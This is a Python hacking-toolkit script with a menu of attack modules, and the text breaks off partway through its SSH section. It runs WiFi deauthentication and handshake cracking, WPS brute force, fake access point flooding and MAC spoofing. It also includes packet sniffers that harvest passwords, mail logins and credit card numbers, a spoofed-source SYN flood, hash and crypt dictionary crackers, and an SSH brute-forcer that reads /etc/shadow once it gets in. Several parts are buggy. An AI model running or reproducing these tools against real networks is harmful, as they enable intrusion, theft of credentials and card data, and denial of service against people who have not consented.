from librerias.lib import *
from librerias.banners import *

RED = '\033[1;31m'
BLUE = '\033[1;34m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
MAGENTA = '\033[1;35m'
WHITE = '\033[1;37m'
CYAN = '\033[1;36m'
END = '\033[0m'

os.system("clear")

def slowly(s):
  try:
    time.sleep(1)
    for w in s + '\n' :
      sys.stdout.write(w)
      sys.stdout.flush()
      time.sleep(1. / 500)
    print('\n')
    time.sleep(2)
  except KeyboardInterrupt:
    time.sleep(1)
    slowly(FAIL+'Exiting...')
    print('\n')
    sys.exit(0)


def menu() :
    banner()
    print("――――――――――――――――――――――――――――――")
    print("\033[1;34m[01]WIFI")                                                   
    print("\033[1;34m[02]SCANNERS")
    print("\033[1;34m[03]OSINT") 
    print("\033[1;34m[04]PASSWORDS")
    print("\033[1;34m[05]WEB")
    print("\033[1;34m[06]BRUTE")
    print("――――――――――――――――――――――――――――――")

menu()

scanner = nmap.PortScanner()

WH1 = input("\033[1;31mPRLS>")

if WH1 == "01" : 
    os.system("clear")
    banner3()
    print("wifi_module")
    print("\033[1;36m\033[1;31m[01] \033[0;35m | Mode monitor      ")  
    print("\033[1;36m\033[1;31m[02] \033[0;35m | Stop mode monitor ")
    print("\033[1;36m\033[1;31m[03] \033[0;35m | See iface         ") 
    print("\033[1;36m\033[1;31m[04] \033[0;35m | Rest Network      ") 
    print("\033[1;36m\033[1;31m[05] \033[0;35m | External Networks airodump ")  
    print("\033[1;36m\033[1;31m[06] \033[0;35m | Capture Handshake ")  
    print("\033[1;36m\033[1;31m[07] \033[0;35m | Uncypher clave    ")  
    print("\033[1;36m\033[1;31m[08] \033[0;35m | AttacK  WPS       ") 
    print("\033[1;36m\033[1;31m[09] \033[0;35m | Fake MAC          ")  
    print("\033[1;36m\033[1;31m[10] \033[0;35m | Fake AP           ")
    print("\033[1;36m\033[1;31m[11] \033[0;35m | see wifi            ")

    def wifi_module() :

        WH2 = input("\033[1;31mwifi>")

        if WH2 == "01" :
            os.system("clear")
            banner1()
            print(" \033[1;34mInterface => ")
            interfaz = input("\033[1;31mPRLS>")
            comando = "airmon-ng start {} && airmon-ng check kill".format(interfaz)
            os.system(comando)
            os.system("python3 main.py")

        elif WH2 == "02":
            os.system("clear")
            banner1()
            print(" \033[1;37mInterface--> ")
            interfaz = input("\033[1;31mPRLS>")
            comando = "airmon-ng stop {}".format(interfaz)  
            os.system(comando)
            os.system("python3 main.py")

        elif WH2 == "03":
            os.system("clear")
            print("\n\033[0m")
            os.system("sudo ifconfig")
            time.sleep(3)
            os.system("clear")
            os.system("python3 main.py")


        elif WH2 == "04":
            os.system("clear")
            banner1()()
            slowly(" \033[1;37mRestarting network...\033[0m")
            comando = "service networking restart && systemctl start NetworkManager"
            os.system(comando)
            print(" \033[1;31mProcess finished\033[0m")
            time.sleep(2)
            os.system("clear")
            os.system("python3 main.py")


        elif WH2 == "05":
            os.system("clear")
            banner1()
            print(" \033[0;37mInterface => ")
            interfaz = input("\033[1;31mPRLS>")
            comando = "airodump-ng {}".format(interfaz)
            print("\n \033[1;31m[WARNING] \033[0;37mWhen this finish press \033[1;37mCTRL + C\033[0m")
            time.sleep(3)
            os.system(comando)
            time.sleep(9)
            os.system("clear")
            os.system("python3 main.py")
        

        elif WH2 == "06":
            os.system("clear")
            banner1()
            print(" \033[1;37mInterface --> ")
            interfaz = input(" \033[1;32m>> \033[0;37m")
            comando = "airodump-ng {}".format(interfaz)
            print("\n \033[1;31m[WARNING] \033[0;37mWhen this finish press \033[1;37mCTRL + C\033[0m")
            time.sleep(2)
            os.system(comando)
            print("\n Insert BSSID")
            bssid = str(input(" \033[1;32m>> \033[0;37m"))
            print("\n Introduce \033[1;32mCH")
            channel = int(input(" \033[1;32m>> \033[0;37m"))
            print("\n Introduce \033[1;32mPath\033[0m were you want to save the handshake:")
            ruta = str(input(" \033[1;32m>> \033[0;37m"))
            print("\n Introduce number of packets (max 10000 | min 0):")
            paquetes = int(input(" \033[1;32m>> \033[0;37m"))
            comando = "airodump-ng -c {} --bssid {} -w {} {} | xterm -e aireplay-ng -0 {} -a {} {}".format(channel,bssid,ruta,interfaz,paquetes,bssid,interfaz)
            os.system(comando)
            time.sleep(2)
            os.system("clear")
            os.system("python3 main.py")


        elif WH2 == "07":
            os.system("clear")
            banner1()
            print(" \033[1;37mInsert handshake:\033[0m")
            ruta = str(input(" \033[1;32m>> \033[0;37m"))
            print("")
            print(" \033[1;37mInsert the diccionary:\033[0m")
            diccionario = str(input(" \033[1;32m>> \033[0;37m"))
            comando = "aircrack-ng {} -w {}".format(ruta,diccionario)
            os.system(comando)
            exit()

        elif WH2 == "08":
            os.system("clear")
            banner1()
            print(" \033[1;37mInsert interface:")
            interfaz = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;37mIntroduce the BSSID dof the AP:")
            bssid = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;37mIntroduce channel AP:")
            channel = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;37mIntroduce the ESSID of the AP:")
            essid = input(" \033[1;32m>> \033[0;37m")
            comando = "bully {} -b {} -c {} -e {} --force".format(interfaz, bssid, channel, essid)
            os.system(comando)

        elif WH2 == "09":
            os.system("clear")
            banner1()
            print(" \033[1;37mIsert interface =>")
            interface = input(" \033[1;32m>> \033[0;37m")
            nuevaMAC= input("Insert new MAC: \033[1;32m>> \033[0;37m")
            os.system(f"ifconfig {interface} down")
            print(f"Changin MAC interface {interface} a {nuevaMAC}")
            os.system(f"ifconfig {interface} hw ether {nuevaMAC}")
            print(f"New MAC is: {nuevaMAC}")
            os.system(f"ifconfig {interface} up")
            print("Interface is ready")
            time.sleep(1)
            os.system(f"ifconfig {interface}")
            time.sleep(4)
            os.system("clear")
            os.system("python3 main.py")
        

        elif WH2 == "10":
            os.system('clear')
            banner1()
            print(" \033[1;34mInsert interface =>")
            interface = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;34mIntroduzca el canal:")
            channel = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;34m¿Do you want to create a fake AP diccionary? [\033[1;32my\033[0m/\033[1;31mn\033[0m]\033[0m")
            crearDic = input(" \033[1;32m>> \033[0;37m")
            if crearDic == 'y':
                os.system('sudo bash AP_generator.sh')

            elif crearDic == 'n':
                pass    

            print("\n\033[1;37m Ingrese la ruta del diccionario\033[0m (default: \033[1;37m/wordlist/fakeAP.txt\033[0m): ")
            diccionario = str(input(" \033[1;32m>> \033[0;37m"))
            print("\n \033[1;31m[AVISO] \033[0;37mPresione \033[1;37m\033[1;37mCTRL + C \033[0;37mpara detener el ataque\033[0m")
            os.system("mdk3 {} b -f {} -a -s 1000 -c {}".format(interface,diccionario,channel))
            time.sleep(2) 
            
        elif WH2 == "11":
            
            access_points = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Security"])
            
            access_points.set_index("BSSID", inplace=True)

            def data_extraction(packet):
                
                if packet.haslayer(Dot11Beacon):
                       
                    bssid ="\033[1;32m ▏  " + packet[Dot11].addr2 + "  ▕"

                   
                    ssid = packet[Dot11Elt].info.decode()

                    try:
                        dBm_Signal = packet.dBm_AntSignal 
                    except:
                        dBm_Signal = "N/A" + "  ▕"
                    
                   
                    stats = packet[Dot11Beacon].network_stats() 
                    channel = stats.get("channel") 
                    security = stats.get("crypto") 
                    
                    access_points.loc[bssid] = (ssid, dBm_Signal, channel, security)

            def print_all():
                while True:
                    os.system("clear")
                    print("Listening on =>" + interface)
                    print("\033[1;34m—" * 80)
                    print(access_points)
                    print("\033[1;34m—" * 80)
                    time.sleep(0.5)
                
            def channel_change():
                channel = 1
                while True:
                    os.system(f"iwconfig {interface} channel {ch}")
                    ch = ch % 14 + 1
                    time.sleep(0.5)
      
            if __name__ == "__main__":

                os.system("iwconfig")
                a = input("Interface =>")
                interface = a                

                printer = Thread(target=print_all)
                printer.daemon = True
                printer.start()
                
                channel_changer = Thread(target=channel_change)
                channel_changer.daemon = True
                channel_changer.start()

                sniff(prn=data_extraction, iface=interface)
    
    wifi_module()

     
if WH1 == "02" :
    os.system("clear")
    banner()
    print("\033[1;36m\033[1;31m[01] \033[0;35m | SYN     ")
    print("\033[1;36m\033[1;31m[02] \033[0;35m | port1    ")
    print("\033[1;36m\033[1;31m[03] \033[0;35m | sniffer ")
    print("\033[1;36m\033[1;31m[04] \033[0;35m | Advance_Port  ")
    print("\033[1;36m\033[1;31m[05] \033[0;35m | http_sniffer  ")
    print("\033[1;36m\033[1;31m[06] \033[0;35m | syn_flood  ")
    print("\033[1;36m\033[1;31m[07] \033[0;35m | Credit Card sniff  ")
    print("\033[1;36m\033[1;31m[08] \033[0;35m | mail_sniffer  ")
    print("\033[1;36m\033[1;31m[09] \033[0;35m | basic_sniffer  ")
    print("\033[1;36m\033[1;31m[10] \033[0;35m | ip_header_sniffer  ")
    print("\033[1;36m\033[1;31m[11] \033[0;35m | icmp_sniffer  ")

    def scanner_module() :

        WH3 = input("scanner_module>")  

        if WH3 == "01" :
            os.system("clear")
            banner()
            ip_addr = input("Please enter the IP address you want to scan: ")
            print("The IP you entered is: ", ip_addr)
            type(ip_addr)
            print(CYAN + "[+] You have selected option: SYN+")
            print("Nmap Version -->", scanner.nmap_version())
            scanner.scan(ip_addr, '1-1024' , '-sS -A -O -sV')
            print()
            print(scanner.scaninfo())
            print(RED)
            print("\033[0;31m Ip Status --> ", scanner[ip_addr].state())
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print()
            print("\033[0;31m ALL_PROTOCOLS -->", scanner[ip_addr].all_protocols)
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print()
            print("\033[0;31m GET_LAST_OUTPUT --> ", scanner.get_nmap_last_output())
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print()
            print("\033[0;31m XML_SCAN --> ", scanner.analyse_nmap_xml_scan())
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print() 
            print("\033[0;32m SCAN_STATS --> ", scanner.scanstats())
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print() 
            print("\033[0;31m Open Ports --> ", scanner[ip_addr]['tcp'].keys())
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print() 
            print("\033[0;32m ALL_IP --> ", scanner[ip_addr].all_ip)
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print()
            print("\033[0;32m ALL_SCTP --> ", scanner[ip_addr].all_sctp)
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print()
            print("\033[0;32m COMMAND_LINE--> ", scanner.command_line())
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print()
            print("\033[0;32m CSV --> ", scanner.csv())
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            print()
            print("\033[0;32m LIST_SCAN --> ", scanner.listscan())
            print()
            print("\033[1;34m ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
            
        elif WH3 == "02" :
            
            def main():
                socket.setdefaulttimeout(0.01)
                network = input("|X|->IP ADDRESS: ")
                startPort = int(input("|X|->START PORT: "))
                endPort = int(input("|X|->END PORT: "))
                scanHost(network, startPort, endPort)
            
            def scanHost(ip, startPort, endPort):
                slowly('[+] Starting TCP port scan on host ---> %s' % ip)
                tcp_scan(ip, startPort, endPort)
                slowly('[+] TCP scan on host %s complete' % ip)


            def scanRange(network, startPort, endPort): 
                slowly(s)('[*] Starting TCP port scan on network ---> %s.0' % network)
                for host in range(1, 255):
                    ip = network + '.' + str(host)
                    tcp_scan(ip, startPort, endPort)

                print('[+] TCP scan on network %s.0 complete' % network)


            def tcp_scan(ip, startPort, endPort):
                for port in range(startPort, endPort + 1):
                    try:
                        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        if not tcp.connect_ex((ip, port)):
                            print('[+] %s:%d/TCP Open' % (ip, port))
                            tcp.close()
                    except Exception:
                        pass
            main()

        elif WH3 == "03":
                input("JLNLH;")
                banner1()

                socketCreated = False
                socketSniffer = 0
            
                def analyzeUDPHeader(dataRecv):
                    udpHeader = struct.unpack('!4H', dataRecv[:8])
                    srcPort = udpHeader[0]
                    dstPort = udpHeader[1]
                    length = udpHeader[2]
                    checksum = udpHeader[3]
                    data = dataRecv[8:]

                    print('\033[1;31m―――――――――UDP HEADER―――――――――')
                    print('Source Port: %hu' % srcPort)
                    print('Destination Port: %hu' % dstPort)
                    print('Length: %hu' % length)
                    print('Checksum: %hu\n' % checksum)

                    return data
                    
                def analyzeTCPHeader(dataRecv):
                    tcpHeader = struct.unpack('!2H2I4H', dataRecv[:20])
                    srcPort = tcpHeader[0]
                    dstPort = tcpHeader[1]
                    seqNum = tcpHeader[2]
                    ackNum = tcpHeader[3]
                    offset = tcpHeader[4] >> 12
                    reserved = (tcpHeader[5] >> 6) & 0x03ff
                    flags = tcpHeader[4] & 0x003f
                    window = tcpHeader[5]
                    checksum = tcpHeader[6]
                    urgPtr = tcpHeader[7]
                    data = dataRecv[20:]

                    urg = bool(flags & 0x0020)
                    ack = bool(flags & 0x0010)
                    psh = bool(flags & 0x0008)
                    rst = bool(flags & 0x0004)
                    syn = bool(flags & 0x0002)
                    fin = bool(flags % 0x0001)

                    print('\033[1;33m―――――――――TCP HEADER―――――――――')
                    print('Source Port: %hu' % srcPort)
                    print('Destination Port: %hu' % dstPort)
                    print('Sequence Number: %u' % seqNum)
                    print('Acknowledgement: %u' % ackNum)
                    print('Flags: ')
                    print('    URG: %d | ACK: %d | PSH: %d | RST: %d | SYN: %d | FIN: %d' % (urg, ack, psh, rst, syn, fin))
                    print('Window Size: %hu' % window)
                    print('Checksum: %hu' % checksum)
                    print('Urgent Pointer: %hu\n' % urgPtr)

                    return data

                def analyzeIP(dataRecv):
                    ipHeader = struct.unpack('!6H4s4s', dataRecv[:20])
                    version = ipHeader[0] >> 12
                    ihl = (ipHeader[0] >> 8) & 0x0f
                    tos = ipHeader[0] & 0x00ff
                    totalLength = ipHeader[1]
                    ipID = ipHeader[2]
                    flags = ipHeader[3] >> 13
                    fragOffset = ipHeader[3] & 0x1fff
                    ipTTL = ipHeader[4] >> 8
                    ipProtocol = ipHeader[4] & 0x00ff
                    checksum = ipHeader[5]
                    srcAddr = socket.inet_ntoa(ipHeader[6])
                    dstAddr = socket.inet_ntoa(ipHeader[7])
                    data = dataRecv[20:]

                    print('\033[1;32m―――――――――IP HEADER―――――――――')
                    print('Version: %hu' % version)
                    print('IHL: %hu' % ihl)
                    print('TOS: %hu' % tos)
                    print('Length: %hu' % totalLength)
                    print('ID: %hu' % ipID)
                    print('Offset: %hu' % fragOffset)
                    print('TTL: %hu' % ipTTL)
                    print('Protocol: %hu' % ipProtocol)
                    print('Checksum: %hu' % checksum)
                    print('Source IP: %s' % srcAddr)
                    print('Destination IP: %s\n' % dstAddr)

                    if ipProtocol == 6:
                        tcp_udp = "TCP"
                    elif ipProtocol == 17:
                        tcp_udp = "UDP"
                    else:
                        tcp_udp = "Other"

                    return data, tcp_udp


                def analyzeEtherHeader(dataRecv):
                    ipBool = False
                    etherHeader = struct.unpack('!6s6sH',dataRecv[:14])
                    dstMac = binascii.hexlify(etherHeader[0]).decode()
                    srcMac = binascii.hexlify(etherHeader[1]).decode()
                    protocol = etherHeader[2] >> 8
                    data = dataRecv[14:]

                    print('―――――――――ETHERNET HEADER―――――――――')
                    print('Destination MAC: %s:%s:%s:%s:%s:%s' % (dstMac[0:2], dstMac[2:4], dstMac[4:6], dstMac[6:8], dstMac[8:10], dstMac[10:12]))
                    print('Source MAC: %s:%s:%s:%s:%s:%s' % (srcMac[0:2], srcMac[2:4], srcMac[4:6], srcMac[6:8], srcMac[8:10], srcMac[10:12]))
                    print('Protocol: %hu\n' % protocol)

                    if protocol == 0x08:
                        ipBool = True

                    return data, ipBool

                def main2():
                    global socketCreated
                    global socketSniffer
                    socketCreated = False
                    socketSniffer = 0

                    if socketCreated == False: 
                        socketSniffer = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
                        socketCreated = True;
                      
                    dataRecv = socketSniffer.recv(2048)
               
                    dataRecv, ipBool = analyzeEtherHeader(dataRecv)
                    
                    if ipBool:
                        dataRecv, tcp_udp = analyzeIP(dataRecv)
                    else:
                        return

                    if tcp_udp == "TCP":
                        dataRecv = analyzeTCPHeader(dataRecv)
                    elif tcp_udp == "UDP":
                        dataRecv = analyzeUDPHeader(dataRecv)
                    else:
                        return
        
                while True:
                    main2()

        elif WH3 == "04" :

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(2)

            host = input("[*] Please Specify a Host to Scan: ")

            def portscanner(port):
                if sock.connect_ex((host,port)):
                    print("[-] Port %d is closed" % (port))
                else:
                    print("[+] Port %d is open" % (port))

            for port in range (1, 1000):
                portscanner(port);
        
        elif WH3 == "05":

            def sniff(interface):
                scapy.sniff(iface=interface, store=False, prn=process_packets)

            def process_packets(packet):
                if packet.haslayer(http.HTTPRequest):
                    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
                    print('URL: ' + url.decode())
                if packet.haslayer(scapy.Raw):
                    load = packet[scapy.Raw].load
                for i in words:
                    if i in str(load):
                        print('Load: ' + load.decode())
                    break
            
            words = ["password", "user", "username", "login", "pass", "Username", "Password", "User", "Email"]
            sniff("enp0s3")

        elif WH3 == "06":

            def synFlood(src, target, message, dstPort):
                ipLayer = IP(src=src, dst=target)
                tcpLayer = TCP(sport=4444, dport=dstPort)
                rawLayer = Raw(load=message)
                packet = ipLayer/tcpLayer/rawLayer
                send(packet)

            src = input("3nter Source IP Address To Fake: ")
            target=input("3nter Target's IP Address: ")
            message = input("3nter Message FOR TCP Payload: ")
            dstPort= int(input("3nter Port to Block: "))

            while True:
                synFlood(src, target, message, dstPort)

        elif WH3 == "07":
            
            def find_credit_card(pkt):
                raw = pkt.sprintf('%Raw.load%')
                america_re = re.findall(r'3[47][0-9]{13}', raw)
                master_re = re.findall(r'5[1-5][0-9]{14}', raw)
                visa_re = re.findall(r'4[0-9]{12}(?:[0-9]{3})?', raw)

                if america_re:
                    print(f'[+] Found American Express Card: {america_re[0]}')
                if master_re:
                    print(f'[+] Found MasterCard Card: {master_re[0]}')
                if visa_re:
                    print(f'[+] Found Visa Card: {visa_re[0]}')


            if __name__ == '__main__':
                parser = argparse.ArgumentParser(
                    usage='python3 credit_sniff.py INTERFACE')
                parser.add_argument('iface', type=str, metavar='INTERFACE',
                                    help='specify interface to listen on')
                args = parser.parse_args()
                conf.iface = args.iface

                try:
                    print('[*] Starting Credit Card Sniffer.')
                    sniff(filter='tcp', prn=find_credit_card, store=0)
                except KeyboardInterrupt:
                    exit(0)

        elif WH3 == "08":
            def packet_callback(packet):
                if packet[TCP].payload:
                    mypacket = str(packet[TCP].payload)
                    if "user" in mypacket.lower() or "pass" in mypacket.lower():
                        print(f"[*] Destination: {packet[IP].dst}")
                        print(f"[*] {str(packet[TCP].payload)}")
            def main(): 
                sniff(
                    filter="tcp port 110 or tcp port 25 or tcp port 143",
                    prn=packet_callback,
                    store=0,
                )


            if __name__ == "__main__":
                main()
            
        elif WH3 == "09":
            
            host = input("Insert_ip: ")

           
            if os.name == "nt":
                socket_protocol = socket.IPPROTO_IP
            else:
                socket_protocol = socket.IPPROTO_ICMP

            sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) 

            sniffer.bind((host, 0))

            
            sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

           
            if os.name == "nt": 
                sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

            print(sniffer.recvfrom(65535))

            # if we're on Windows turn off promiscuous mode
            if os.name == "nt":
                sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
        
        elif WH3 == "10":
            
            host = input("Insert_ip: ")
            
            class IP(Structure):
                _fields_ = [
                    ("ihl", c_ubyte, 4),
                    ("version", c_ubyte, 4),
                    ("tos", c_ubyte),
                    ("len", c_ushort),
                    ("id", c_ushort),
                    ("offset", c_ushort),
                    ("ttl", c_ubyte),
                    ("protocol_num", c_ubyte),
                    ("sum", c_ushort),
                    ("src", c_uint32),
                    ("dst", c_uint32)
                ]

                def __new__(cls, socket_buffer=None):
                    return cls.from_buffer_copy(socket_buffer)

                def __init__(self, socket_buffer=None):
                    self.socket_buffer = socket_buffer

                    
                    self.protocol_map = {1: "ICMP", 6: "TCP", 17: "UDP"}

                    
                    self.src_address = socket.inet_ntoa(struct.pack("@I", self.src))
                    self.dst_address = socket.inet_ntoa(struct.pack("@I", self.dst))

                    
                    try:
                        self.protocol = self.protocol_map[self.protocol_num]
                    except IndexError:
                        self.protocol = str(self.protocol_num)


            if os.name == "nt":
                socket_protocol = socket.IPPROTO_IP
            else:
                socket_protocol = socket.IPPROTO_ICMP

            sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)

            sniffer.bind((host, 0))

            sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            if os.name == "nt":
                sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

            try:
                while True:
                    raw_buffer = sniffer.recvfrom(65535)[0]
                    
                    ip_header = IP(raw_buffer[:20])

                    print("Protocol: %s %s -> %s" % (
                        ip_header.protocol,
                        ip_header.src_address,
                        ip_header.dst_address)
                        )

            except KeyboardInterrupt:
                
                if os.name == "nt":
                    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)

        elif WH3 == "11":

            class IP:
                def __init__(self, buff=None):
                    header = struct.unpack("<BBHHHBBH4s4s", buff)
                    self.ver = header[0] >> 4
                    self.ihl = header[0] & 0xF

                    self.tos = header[1]
                    self.len = header[2]
                    self.id = header[3]
                    self.offset = header[4]
                    self.ttl = header[5]
                    self.protocol_num = header[6]
                    self.sum = header[7]
                    self.src = header[8]
                    self.dst = header[9]

                    # human readable IP addresses
                    self.src_address = ipaddress.ip_address(self.src)
                    self.dst_address = ipaddress.ip_address(self.dst)

                    # map protocol constants to their names
                    self.protocol_map = {1: "ICMP", 6: "TCP", 17: "UDP"}
                    try:
                        self.protocol = self.protocol_map[self.protocol_num]
                    except Exception as e:
                        print(f"{e} No protocol for {self.protocol_num}")
                        self.protocol = str(self.protocol_num)


            class ICMP:
                def __init__(self, buff):
                    header = struct.unpack("<BBHHH", buff)
                    self.type = header[0]
                    self.code = header[1]
                    self.sum = header[2]
                    self.id = header[3]
                    self.seq = header[4]


            def sniff(host):
                if os.name == "nt":
                    socket_protocol = socket.IPPROTO_IP
                else:
                    socket_protocol = socket.IPPROTO_ICMP

                sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
                sniffer.bind((host, 0))
                sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                if os.name == "nt":
                    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

                try:
                    while True:
                        raw_buffer = sniffer.recvfrom(65535)[0]
                        ip_header = IP(raw_buffer[0:20])
                        if ip_header.protocol == "ICMP":
                            print(
                                "Protocol: %s %s -> %s"
                                % (ip_header.protocol, ip_header.src_address, ip_header.dst_address)
                            )
                            print(
                                f"Version: {ip_header.ver} Header Length: {ip_header.ihl}  TTL: {ip_header.ttl}"
                            )

                            # calculate where our ICMP packet starts
                            offset = ip_header.ihl * 4
                            buf = raw_buffer[offset : offset + 8]
                            icmp_header = ICMP(buf)
                            print(
                                "ICMP -> Type: %s Code: %s\n" % (icmp_header.type, icmp_header.code)
                            )

                except KeyboardInterrupt:
                    if os.name == "nt":
                        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
                    sys.exit()


            if __name__ == "__main__":
                if len(sys.argv) == 2:
                    host = sys.argv[1]
                else:
                    host = input("192.168.1.66:")
                sniff(host)

                    
    scanner_module()                   

if WH1 == "03" :
    os.system("clear")
    print("\033[1;36m\033[1;31m[1]  \033[0;35m | IGDox             ")
    

  
    osint_module()

if WH1 == "04" :
    os.system("clear")
    banner()
    print("password_module")
    print("\033[1;36m\033[1;31m[01]\033[0;35m | Hasher ")
    print("\033[1;36m\033[1;31m[02]\033[0;35m | CryptForce ")
    print("\033[1;36m\033[1;31m[03]\033[0;35m | md5Brute ")
    print("\033[1;36m\033[1;31m[04]\033[0;35m | sha1Hash")
    
    def password_module() :
        WH5 = input("password_module>")

        if WH5 == "01" :

            hashValue = input('Enter String to Hash: ')

            hashmd5 = hashlib.md5()
            hashmd5.update(hashValue.encode())
            print('MD5 Hash: ' + hashmd5.hexdigest())

            hashsha1 = hashlib.sha1();
            hashsha1.update(hashValue.encode())
            print('SHA1 Hash: ' + hashsha1.hexdigest())

            hashsha224 = hashlib.sha224()
            hashsha224.update(hashValue.encode())
            print('SHA224 Hash: ' + hashsha224.hexdigest())

            hashsha256 = hashlib.sha256()
            hashsha256.update(hashValue.encode())
            print('SHA256 Hash: ' + hashsha256.hexdigest())

            hashsha512 = hashlib.sha512()
            hashsha512.update(hashValue.encode())
            print('SHA512 Hash: ' + hashsha512.hexdigest())

        
        elif WH5 == "02" :

            def crackPassword(username, password):
                salt = password[0:2]
                dictionary = open('crypt_dictionary.txt', 'r')
            for word in dictionary:
                word = word.strip('\n')
                cryptPassword = crypt.crypt(word, salt)
            if password == cryptPassword:
                print(Fore.GREEN + '[+] Found Password\t\t\t' + username + ' : ' + word)
                return
                print(Fore.RED + '[-] Unable to Crack Password For:\t' + username)
    
            def main():
                try:
                    passwordFile = open('crypt_passwords.txt', 'r')
                except:
                    print('[-] File Not Found')
                    quit()
                for line in passwordFile.readlines():
                    username = line.split(':')[0]    
                    password = line.split(':')[1].strip('\n')
                    #print(Fore.RED + '[*] Cracking Password For: ' + username)
                    crackPassword(username, password)
    

            main()

        elif WH5 == "03" :
            def openFile(wordList):
                try:    
                    file = open(wordList, 'r')
                    return file
                except:
                    print("[-] File Not Found")
                    quit()

            passwordHash = input('Enter MD5 Hash Value: ')
            wordList = input('Enter Path to Password File: ')
            file = openFile(wordList)
        
            for word in file:
                print(Fore.YELLOW + '[*] Trying: ' + word.strip('\n'))
                encodeWord = word.encode('UTF-8')
                md5Hash = hashlib.md5(encodeWord.strip()).hexdigest()

                if md5Hash == passwordHash:
                    print(Fore.GREEN + '[+] Password Found: ' + word)
                    exit(0)
                else:
                    pass

                print('[-] Password Not in List')

        elif WH5 == "04" :
            print("soon...")
    password_module()

if WH1 == "05" :
    os.system("clear")
    banner()
    print("web_module")
    print("\033[1;36m\033[1;31m[01]\033[0;35m | **** ")
    print("\033[1;36m\033[1;31m[02]\033[0;35m | ***** ")
    print("\033[1;36m\033[1;31m[03]\033[0;35m | ***** ")
    print("\033[1;36m\033[1;31m[04]\033[0;35m | ******")
    print("\033[1;36m\033[1;31m[05]\033[0;35m | **** ")
    print("\033[1;36m\033[1;31m[06]\033[0;35m | ***** ")
    print("\033[1;36m\033[1;31m[07]\033[0;35m | ***** ")
    print("\033[1;36m\033[1;31m[08]\033[0;35m | ******")
    
    def web_module() :
        WH6 = input("web_module>")

        if WH6 == "01" :

            
            web_module()

if WH1 == "06" :
    os.system("clear")
    banner()
    print("brute_module")
    print("\033[1;36m\033[1;31m[01]\033[0;35m | ssh_brute")
    print("\033[1;36m\033[1;31m[02]\033[0;35m | ssh_Login")
    print("\033[1;36m\033[1;31m[02]\033[0;35m | ftp_brute")

    
    def brute_module() :
        WH7 = input("brute_module>")

        if WH7 == "01" :

            print(""" 
             _______ _______ _     _     ______   ______ _     _ _______ _______
             |______ |______ |_____| ___ |_____] |_____/ |     |    |    |______
             ______| ______| |     |     |_____] |    \_ |_____|    |    |______
             """)

            PROMPT = ['# ', '>>> ', '> ', '\$ ', '$ ']

            def send_command(connection, command):
                connection.sendline(command)
                connection.expect(PROMPT)
                print(connection.before.decode())

            def connect(user, host, password):
                ssh_newkey = 'Are you sure you want to continue connecting'
                connString = 'ssh ' + user + '@' + host
                spawn = pexpect.spawn(connString)
                ret = spawn.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
                if ret == 0:
                    print('[-] Error Connecting')
                    return
                
                if ret == 1:
                    spawn.sendline('Yes')
                    ret = spawn.expcet([pexpect.TIMEOUT, '[P|p]assword: '])
                    if ret == 0:
                        print('[-] Error Connecting')
                        return
                spawn.sendline(password)
                spawn.expect(PROMPT, timeout=0.1)
                return spawn

            def main():
                host = input("Enter IP address of Target to Bruteforce: ")
                user = input("Enter User Account to Bruteforce: ")
                file = open('passwords.txt', 'r')
                for password in file.readlines():
                    password = password.strip('\n')
                    try:
                        spawn = connect(user, host, password)
                        print(Fore.GREEN + '[+] Password Found: ' + password)
                        send_command(spawn, 'cat /etc/shadow')
                    except:
                        print(Fore.RED + '[-] Wrong Password: ' + password)
            main()
        
        elif WH7 == "02" :

            print("SSH_LOGIN")

            PROMPT = ['# ', '>>> ', '> ', '\$ ', '$ ']

            def send_command(connection, command):
                connection.sendline(command)
                connection.expect(PROMPT)
                print(connection.before.decode())

            def connect(user, host, password):
                ssh_newkey = 'Are you sure you want to continue connecting'
                connString = 'ssh ' + user + '@' + host
                spawn = pexpect.spawn(connString)
                ret = spawn.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
                if ret == 0:
                    print('[-] Error Connecting')
                    return
                
                if ret == 1:
                    spawn.sendline('Yes')
